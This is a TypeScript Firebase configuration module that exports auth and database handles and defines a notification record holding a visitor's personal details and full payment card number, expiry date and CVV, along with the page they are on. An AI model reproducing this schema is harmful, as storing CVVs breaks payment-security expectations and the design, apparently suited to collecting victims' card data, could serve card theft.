import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBfyJ96ZmpULbhebZEiXq962yUrIJMjT28",
  authDomain: "fire-f624c.firebaseapp.com",
  projectId: "fire-f624c",
  storageBucket: "fire-f624c.firebasestorage.app",
  messagingSenderId: "407123661352",
  appId: "1:407123661352:web:d70dd6449ae6108f4f5b1d",
  measurementId: "G-5B1C98CFQD"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

